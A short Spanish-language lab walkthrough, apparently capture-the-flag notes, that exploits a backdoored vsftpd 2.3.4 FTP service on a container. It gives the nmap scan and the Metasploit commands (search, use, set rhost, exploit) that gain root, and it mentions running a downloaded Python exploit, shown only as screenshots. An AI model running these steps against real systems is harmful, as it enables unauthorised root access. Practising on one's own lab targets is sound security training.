realizamos ping

$ `nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv {IP}` $

solo el puerto 21 abierto, el ftp, obervamos que version esta corriendo ese servicio y observamos una vesion desactualziada que ya vimos en otra maquina, buscamos la version en google y arrancamos metasploits, otra opcion seria buscar el cve para explotar desde ahi 

$ msfconsole
$ search vsftpd 2.3.4

observamos un exploit del 1011

$ use 0
$ options
no hay nigun rhosts configurado y ponemos la ip del contenedor con set rhost
![[Pasted image 20260104174238.png]]

$ exploit
$ whomi, ya seriamos usuario root

otra opcion seria uscar un exploit en internet : 
![[Pasted image 20260104174405.png]]

darle raw ya que nos interesa ese script

![[Pasted image 20260104174425.png]]
![[Pasted image 20260104174446.png]]


![[Pasted image 20260104174454.png]]

le damos permisos de ejecucion 
![[Pasted image 20260104174513.png]]
con python 3 se ejecuta

![[Pasted image 20260104174638.png]]
![[Pasted image 20260104174654.png]]
